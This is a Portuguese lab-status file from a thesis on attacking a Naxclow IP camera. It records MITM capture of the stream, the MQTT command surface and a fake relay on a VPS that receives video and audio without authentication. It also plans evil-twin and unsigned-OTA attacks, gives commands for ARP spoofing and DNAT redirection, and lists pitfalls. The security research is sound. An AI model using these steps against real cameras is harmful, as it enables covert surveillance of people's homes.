# Próximos passos e estado do lab

> **Ponto de entrada pra retomar o TCC.** O detalhe de cada vetor está nos `achados_*.md`
> (links abaixo). Este arquivo é o mapa: o que já foi, o que falta, onde rodar e as armadilhas.

## Estado do lab

| Item | Valor |
|---|---|
| Câmera | Naxclow Y2SN, firmware `202601081657`, `devicesCode 5c001502B330` |
| LAN da câmera | `192.168.0.17` (gw `192.168.0.1`), MAC `5c:f1:50:04:af:8a` |
| IP público da câmera | `191.187.210.110` |
| VPS (relay falso) | `137.131.132.251` (Ubuntu aarch64), repo em `/home/sentinela-tcc`, venv `.venv` |
| Relay do cloud | `107.149.143.96` / `107.149.136.10` … portas `29939`–`29942` |
| Broker MQTT (cloud) | pool de IPs (ex.: `39.108.171.214:1883`), **sem TLS** |
| Kali | atacante (ARP spoof / DNAT / monitor) |
| Fake server | `src/a9_naxclow.py -s` (HTTP `:8080` + relay TCP/UDP `:29940`) |

Doc de protocolo (payloads, portas, handshake): [`protocolo_naxclow.md`](protocolo_naxclow.md).

## Concluído

- ✅ **Stream em STA via MITM** — capturado e remontado (`achados_sta.md` + `scripts/utils/extract_mitm_video_udp.py`).
- ✅ **Superfície MQTT** — `wifiscan`, `record`, `ledei`, `setwifi`, `format` (`achados_mqtt.md`).
- ✅ **Stream em AP** — capturado (`achados_ap.md`).
- ✅ **RE do APK** — relay antigo + WebRTC do app 3.3.0.
- ✅ **Relay falso em IP público (VPS)** — a câmera registra num relay do atacante e entrega **vídeo + áudio**, sem app e sem auth (`achados_fakeserver_relay.md`).
- ✅ **Consolidação** — `docs/achados_finais.md` (OWASP/CVSS + provado vs pendente).

## Pendente (ordem) — e onde rodar

1. **Evil twin (cenário 2)** — AP clone da rede da vítima, sem a senha do WiFi; a câmera/telefone associa sozinho. **Só roda no Linux/Kali** (hostapd + modo monitor/injeção; macOS não faz). Precisa dongle USB **AR9271** ou **RT5370**.
2. **Modo AP: SD card** — `python3 src/a9_naxclow.py -f` (listar datas/horas) e `-d <data-hora>` (baixar gravação). **Roda no Mac** (Python puro; só entrar na rede da câmera `192.168.169.1:6123`).
3. **OTA / firmware** — servir um `ota_url` pelo fake (`getDevInfo`/`getA9ConfCheck`) e ver se a câmera aceita update sem assinatura. O fake roda na VPS (Mac pode orquestrar via `ssh`; se precisar de DNS/DNAT local, exige Linux).

**Resumo de plataforma:** só o **evil twin** prende na Kali. SD card e OTA dá pra tocar no Mac.

## Armadilhas conhecidas (não repetir)

- **A porta do relay varia** (`29939`–`29942`): o DNAT tem que cobrir a **faixa**, em TCP **e** UDP. Cobrir só `29940` não pega (o SYN-ACK volta do relay real).
- **NAT probe é validado:** os **defaults do `v720_sta.py`** (`cliIp 191.187.210.110`, `cliPort 47006`, `cliNatIp 192.168.0.21`, `cliNatPort 53929`) são os valores do capture real. **Não** sobrescrever com valor errado (ex. `cliIp` = IP da VPS) — a câmera rejeita o `code 11` (sem `code 12`) e o canal não abre.
- **Fake precisa de IP público:** a câmera só abre o canal de dados pra endpoint **público** (relay). Em IP local (AP isolado) ela registra mas nunca abre o `:29940`.
- **Viewer tem que estar em 4G/3G:** na mesma WiFi a câmera conecta em P2P local e **não** passa pelo relay.
- **macOS:** `pf rdr` não entrega o relay no socket local — usar Linux/iptables.
- **Firmware cicla o TCP** (~12–47 s): o device re-registra sozinho; o fake mantém o device no `/dev/list` e o UDP vivo entre ciclos.

## Como subir o lab (relay falso)

**VPS:**
```bash
sudo FAKE_SRV_HOST=137.131.132.251 FAKE_SRV_RELAY_HOST=137.131.132.251 \
  .venv/bin/python src/a9_naxclow.py -s -v --proxy-port 8080
```

**Kali** (mesma LAN da câmera):
```bash
sudo DNAT_TARGET=137.131.132.251 ./scripts/mitm_dns/mitm_dns.sh relay
```

Endpoints do fake: `/dev/list`, `/dev/<uid>/live|audio|snapshot|hls`, `/dev/<uid>/fwd?v=<code>` (manda um `301` com `content.code`).

## Ferramentas

- `src/a9_naxclow.py` — `-s` fake server · `-f`/`-d` SD card (AP) · `-l` live (AP).
- `scripts/mitm_dns/mitm_dns.sh` — ARP spoof + DNAT (`relay`, `DNAT_TARGET`).
- `scripts/utils/extract_mitm_video_udp.py` — remontagem do stream UDP.
- `src/v720_hls.py` — JPEG → HLS/H.264 (ffmpeg).
- `scripts/fakeserver/fake_srv_cmd.sh` — comandos MQTT.
